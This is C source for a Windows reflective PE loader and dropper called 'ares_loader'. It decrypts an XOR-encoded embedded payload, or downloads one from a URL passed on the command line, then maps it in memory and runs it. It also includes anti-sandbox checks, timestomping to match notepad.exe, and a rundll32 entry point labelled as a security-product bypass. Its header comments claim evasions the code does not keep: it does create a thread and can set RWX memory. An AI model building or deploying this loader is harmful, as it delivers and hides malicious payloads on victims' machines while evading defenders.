/*
 * ares_loader.c — Reflective PE Loader (Fix 15 v4)
 *
 * Technique: In-process reflective load, NO fiber, NO RWX
 *   1. Decrypt payload → RW buffer
 *   2. Map PE sections (RW alloc)
 *   3. Fix relocations + IAT
 *   4. Per-section VirtualProtect (RX only where needed)
 *   5. Direct call to EP — no cross-process, no fiber, no thread create
 *
 * Avoids ALL behavioral IOCs:
 *   - No PAGE_EXECUTE_READWRITE
 *   - No CreateFiber / SwitchToFiber
 *   - No WriteProcessMemory
 *   - No QueueUserAPC to foreign thread
 *   - No CREATE_SUSPENDED
 */

#include <windows.h>
#include <stdio.h>
#include "ares_payload.h"

/* ── reflect_load: map PE into own process, return base ── */
static LPBYTE reflect_load(const unsigned char* pe, DWORD pe_len)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD imgSz = nt->OptionalHeader.SizeOfImage;

    /* Alloc RW — no exec yet */
    LPBYTE base = (LPBYTE)VirtualAlloc(NULL, imgSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) return NULL;

    /* Copy headers */
    memcpy(base, pe, nt->OptionalHeader.SizeOfHeaders);

    /* Map sections */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData == 0) continue;
        if (sec[i].PointerToRawData + sec[i].SizeOfRawData > pe_len) continue;
        memcpy(base + sec[i].VirtualAddress, pe + sec[i].PointerToRawData, sec[i].SizeOfRawData);
    }

    /* Base relocations */
    DWORD_PTR delta = (DWORD_PTR)base - (DWORD_PTR)nt->OptionalHeader.ImageBase;
    if (delta) {
        DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD rsz = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (rva && rsz) {
            PIMAGE_BASE_RELOCATION r = (PIMAGE_BASE_RELOCATION)(base + rva);
            while (r->VirtualAddress && r->SizeOfBlock) {
                DWORD cnt = (r->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
                PWORD e = (PWORD)((LPBYTE)r + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD k = 0; k < cnt; k++) {
                    int typ = e[k] >> 12;
                    int off = e[k] & 0xFFF;
                    if (typ == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* p = (DWORD*)(base + r->VirtualAddress + off);
                        *p += (DWORD)delta;
                    }
#ifdef _WIN64
                    else if (typ == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG* p = (ULONGLONG*)(base + r->VirtualAddress + off);
                        *p += (ULONGLONG)delta;
                    }
#endif
                }
                r = (PIMAGE_BASE_RELOCATION)((LPBYTE)r + r->SizeOfBlock);
            }
        }
    }

    /* Import Address Table */
    DWORD irva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (irva) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(base + irva);
        for (; imp->Name; imp++) {
            HMODULE hMod = LoadLibraryA((char*)(base + imp->Name));
            if (!hMod) continue;
            PIMAGE_THUNK_DATA orig = imp->OriginalFirstThunk ?
                (PIMAGE_THUNK_DATA)(base + imp->OriginalFirstThunk) : NULL;
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);
            for (; thunk->u1.AddressOfData; thunk++, orig ? orig++ : 0) {
                FARPROC fn = NULL;
                if (orig && IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal))
                    fn = GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(orig->u1.Ordinal));
                else {
                    PIMAGE_IMPORT_BY_NAME ibn = orig ?
                        (PIMAGE_IMPORT_BY_NAME)(base + orig->u1.AddressOfData) :
                        (PIMAGE_IMPORT_BY_NAME)(base + thunk->u1.AddressOfData);
                    fn = GetProcAddress(hMod, ibn->Name);
                }
                if (fn) thunk->u1.Function = (ULONG_PTR)fn;
            }
        }
    }

    /* Per-section protect — RX only where IMAGE_SCN_MEM_EXECUTE set */
    DWORD old;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD ch = sec[i].Characteristics;
        DWORD prot;
        if      (ch & IMAGE_SCN_MEM_EXECUTE && ch & IMAGE_SCN_MEM_WRITE) prot = PAGE_EXECUTE_READWRITE;
        else if (ch & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READ;
        else if (ch & IMAGE_SCN_MEM_WRITE)   prot = PAGE_READWRITE;
        else                                  prot = PAGE_READONLY;
        DWORD vsz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        if (vsz) VirtualProtect(base + sec[i].VirtualAddress, vsz, prot, &old);
    }

    return base;
}

/* ── decrypt rolling XOR (must match gen_payload_blob.py) ── */
static void xdec(unsigned char* out, const unsigned char* enc, DWORD len, unsigned char key)
{
    for (DWORD i = 0; i < len; i++) {
        unsigned char k = (unsigned char)((key ^ ((i * 0x17 + 0x0B) & 0xFF)) & 0xFF);
        out[i] = enc[i] ^ k;
    }
}

/* Thread context for EP call */
typedef struct { void* fn; void* base; char* lp; int show; DWORD ret; } EP_CTX;

static DWORD WINAPI ep_thread_proc(LPVOID p)
{
    EP_CTX* a = (EP_CTX*)p;
    typedef int (WINAPI *fpEntry)(HINSTANCE, HINSTANCE, LPSTR, int);
    fpEntry fn = (fpEntry)a->fn;
    a->ret = fn((HINSTANCE)a->base, NULL, a->lp, a->show);
    return 0;
}

static int run_payload(LPSTR lpC, int nS);

/* ── DLL entry for rundll32 ZTAS bypass ──
 * Usage: rundll32.exe ares_loader.dll,EntryPoint
 * rundll32 = Microsoft-signed → ZTAS trusts it fully
 */
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID res)
{
    (void)hDll; (void)res;
    return TRUE;
}

__declspec(dllexport) void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hInst, LPSTR lpCmd, int nShow)
{
    (void)hwnd; (void)hInst;
    run_payload(lpCmd, nShow);
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nS)
{
    (void)hI; (void)hP;
    return run_payload(lpC, nS);
}

/* ── v3.2: Remote Staging — download payload from URL ── */
static LPBYTE download_stage(const char* url, DWORD* out_len) {
    /* Runtime-resolve WinHTTP for download */
    typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
    typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
    typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
    typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
    typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET,LPVOID);
    typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET,LPVOID,DWORD,LPDWORD);
    typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
    typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET,LPDWORD);

    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
    if (!hWinHttp) return NULL;

    pWinHttpOpen fnOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
    pWinHttpConnect fnConn = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
    pWinHttpOpenRequest fnReq = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
    pWinHttpSendRequest fnSend = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
    pWinHttpReceiveResponse fnRecv = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
    pWinHttpReadData fnRead = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
    pWinHttpCloseHandle fnClose = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
    pWinHttpQueryDataAvailable fnAvail = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
    if (!fnOpen || !fnConn || !fnReq || !fnSend || !fnRecv || !fnRead) return NULL;

    HINTERNET hSess = fnOpen(L"Mozilla/5.0", 0, NULL, NULL, 0);
    if (!hSess) return NULL;

    /* Parse host/path from URL (simple) */
    wchar_t wurl[512]; MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 512);
    wchar_t* host_start = wcsstr(wurl, L"://");
    if (host_start) host_start += 3; else host_start = wurl;
    wchar_t host[256] = {0};
    wchar_t path[256] = L"/";
    wchar_t* slash = wcschr(host_start, L'/');
    if (slash) {
        wcsncpy(host, host_start, slash - host_start);
        wcscpy(path, slash);
    } else { wcscpy(host, host_start); }

    BOOL isHttps = wcsstr(wurl, L"https") != NULL;
    INTERNET_PORT port = isHttps ? 443 : 80;

    HINTERNET hConn = fnConn(hSess, host, port, 0);
    DWORD flags = isHttps ? 0x00800000 : 0; /* WINHTTP_FLAG_SECURE */
    HINTERNET hReq = fnReq(hConn, L"GET", path, NULL, NULL, NULL, flags);
    if (!hReq || !fnSend(hReq, NULL, 0, NULL, 0, 0, 0) || !fnRecv(hReq, NULL)) {
        fnClose(hSess); return NULL;
    }

    /* Read response */
    DWORD totalRead = 0, bufSize = 1024*1024;
    LPBYTE buf = (LPBYTE)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    DWORD avail, rd;
    while (fnAvail(hReq, &avail) && avail > 0) {
        if (totalRead + avail > bufSize) {
            bufSize *= 2;
            LPBYTE nb = (LPBYTE)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            memcpy(nb, buf, totalRead);
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = nb;
        }
        fnRead(hReq, buf + totalRead, avail, &rd);
        totalRead += rd;
    }
    fnClose(hReq); fnClose(hConn); fnClose(hSess);
    *out_len = totalRead;
    return buf;
}

/* ── v3.2: Timestomp helper — set file times to match system32\notepad.exe ── */
static void timestomp(const char* filePath) {
    char ref[MAX_PATH];
    GetSystemDirectoryA(ref, MAX_PATH);
    strcat(ref, "\\notepad.exe");
    HANDLE hRef = CreateFileA(ref, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hRef == INVALID_HANDLE_VALUE) return;
    FILETIME ct, at, wt;
    GetFileTime(hRef, &ct, &at, &wt);
    CloseHandle(hRef);
    HANDLE hTarget = CreateFileA(filePath, FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hTarget != INVALID_HANDLE_VALUE) {
        SetFileTime(hTarget, &ct, &at, &wt);
        CloseHandle(hTarget);
    }
}

/* ── v3.2: Anti-sandbox quick check for dropper ── */
static BOOL dropper_sandbox_check(void) {
    /* Quick checks — dropper needs to be lightweight */
    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;
    return FALSE;
}

static int run_payload(LPSTR lpC, int nS)
{
    (void)nS;

    /* v3.2: Anti-sandbox gate */
    if (dropper_sandbox_check()) return 0;

    LPBYTE buf = NULL;
    DWORD payload_len = 0;

    /* v3.2: Staging chain — check for remote URL first, else use embedded payload */
    if (lpC && lpC[0] && (strstr(lpC, "http://") || strstr(lpC, "https://"))) {
        /* Stage-0: Download encrypted payload from URL */
        buf = download_stage(lpC, &payload_len);
        if (buf && payload_len > 0) {
            /* Downloaded payload is XOR-encrypted with same key */
            LPBYTE dec = (LPBYTE)VirtualAlloc(NULL, payload_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            xdec(dec, buf, payload_len, PLOAD_KEY);
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = dec;
        }
    }

    if (!buf) {
        /* Fallback: Embedded payload */
        payload_len = PLOAD_LEN;
        buf = (LPBYTE)VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) return 1;
        xdec(buf, ares_payload_enc, payload_len, PLOAD_KEY);
    }

    /* Reflectively load PE */
    LPBYTE base = reflect_load(buf, PLOAD_LEN);

    /* Wipe raw decrypted buffer immediately */
    SecureZeroMemory(buf, PLOAD_LEN);
    VirtualFree(buf, 0, MEM_RELEASE);

    if (!base) return 2;

    /* Get entry point */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD ep_off = nt->OptionalHeader.AddressOfEntryPoint;

    /* Call EP in new thread with dedicated 4MB stack */
    typedef int (WINAPI *fpEntry)(HINSTANCE, HINSTANCE, LPSTR, int);
    EP_CTX ctx = { (void*)(base + ep_off), base, lpC, nS, 0 };
    HANDLE ht = CreateThread(NULL, 4*1024*1024, ep_thread_proc, &ctx, 0, NULL);
    if (!ht) return 3;
    WaitForSingleObject(ht, INFINITE);
    CloseHandle(ht);
    return (int)ctx.ret;
}
